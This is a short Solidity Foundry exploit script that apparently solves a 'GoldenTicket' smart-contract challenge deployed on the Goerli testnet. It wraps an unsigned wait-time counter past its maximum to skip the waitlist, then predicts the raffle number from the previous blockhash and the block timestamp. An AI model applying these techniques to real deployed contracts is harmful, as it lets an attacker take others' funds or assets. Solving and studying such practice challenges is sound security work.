
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "./GoldenTicket.sol";

/// @dev forge script script/Attack.s.sol:Attack --rpc-url $ETH_GOERLI_RPC_URL --broadcast

contract GoldenTicketCracker {
  
  // Need a contract to execute 
  function crack() external {
        GoldenTicket goldenTicket = GoldenTicket(0x29B26E93fE6Bd6533eB8135200A327fd7f8Fb89c);
        goldenTicket.joinWaitlist();

        goldenTicket.updateWaitTime(type(uint40).max - goldenTicket.waitlist(address(this)) + 2);
        
        uint256 _guess = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        
        goldenTicket.joinRaffle(_guess);
        goldenTicket.giftTicket(tx.origin);
  }
   
}
